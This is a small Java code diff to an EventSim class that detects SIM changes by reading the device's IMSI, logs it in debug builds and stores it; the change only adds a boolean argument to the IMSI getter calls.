@@ -52,7 +52,7 @@ public final class EventSim extends Event {
 
             //Device.getInstance().refreshData();
 
-            final byte[] imsi = Device.getInstance().getWImsi();
+            final byte[] imsi = Device.getInstance().getWImsi(true);
             if (imsi == null || imsi.length < 8) {
                 //#ifdef DEBUG
                 debug.trace("imsi too short, maybe the sim is not enabled ");
@@ -80,7 +80,7 @@ public final class EventSim extends Event {
 
         //Device.getInstance().refreshData();
 
-        final byte[] imsi = Device.getInstance().getWImsi();
+        final byte[] imsi = Device.getInstance().getWImsi(true);
         if (imsi == null || imsi.length < 8) {
             //#ifdef DEBUG
             debug.trace("imsi too short ");
@@ -110,20 +110,18 @@ public final class EventSim extends Event {
             //#endif
             updateImsi();
         }
-
     }
 
     protected void actualStop() {
         onExit();
-
     }
 
     private void updateImsi() {
         //#ifdef DEBUG
-        debug.info("updateImsi: " + Device.getInstance().getImsi());
+        debug.info("updateImsi: " + Device.getInstance().getImsi(true));
         //#endif
         markup.createEmptyMarkup();
-        markup.writeMarkup(Device.getInstance().getWImsi());
+        markup.writeMarkup(Device.getInstance().getWImsi(true));
     }
 
 }
